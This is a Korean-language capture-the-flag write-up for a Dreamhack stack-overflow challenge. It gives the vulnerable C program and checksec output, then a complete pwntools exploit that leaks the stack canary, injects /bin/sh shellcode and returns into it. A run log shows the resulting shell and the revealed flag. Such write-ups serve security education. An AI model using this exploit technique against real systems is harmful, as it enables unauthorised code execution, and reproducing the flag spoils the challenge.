# 문제
```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

# 분석
- file, checksec
```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/Return to Shellcode]
└─$ file r2s
r2s: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=15e9dea98164c863a718820de5bd4261ea48e1d7, not stripped

┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/Return to Shellcode]
└─$ checksec r2s
[*] '/home/foo1/Desktop/Dreamhack/Return to Shellcode/r2s'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments

```

스택에서 코드 실행이 가능하고, Canary가 있음

첫 입력 때, BOF를 이용해 Canary leak 할 수 있고,
2번째 입력 때, 쉘코드 삽입해 exploit할 수 있음

# Exploit
```python
from pwn import *

# p=process("./r2s")
p=remote("host3.dreamhack.games", 14505)
#context.log_level="debug"

shellcode=b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
bufsize=88
sfpsize=8
bufaddr=b''
cnry=b'\x00'
payload=b''

p.recvuntil("buf: ")
bufaddr+=p64(int(p.recv(14),16))

payload+=b'a'*(bufsize+1)
p.recvuntil("Input: ")
p.send(payload)

p.recvuntil("a"*(bufsize+1))
cnry+=p.recv(7)

payload=b''
payload+=shellcode.ljust(bufsize,b'\x90')
payload+=cnry
payload+=b'b'*sfpsize
payload+=bufaddr

p.sendline(payload)

p.interactive()
```

```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/Return to Shellcode]
└─$ python3 exploit.py 
[+] Opening connection to host3.dreamhack.games on port 14505: Done
[*] Switching to interactive mode
\xe0\xc9\xcfV'
[2] Overwrite the return address
Input: $ ls
flag
r2s
$ cat flag
DH{333eb89c9d2615dd8942ece08c1d34d5}
[*] Got EOF while reading in interactive
$ 
```

여기서 ljust를 사용하는 부분을 아래와 같이 사용해도 exploit 하는데는 문제가 없지만 ljust를 사용하면, 패딩을 원하는 바이트로 설정할 수 있음
```python
#payload+=shellcode.ljust(bufsize,b'\x90')
payload+=shellcode
payload+=b'a'*(bufsize-len(payload))
```

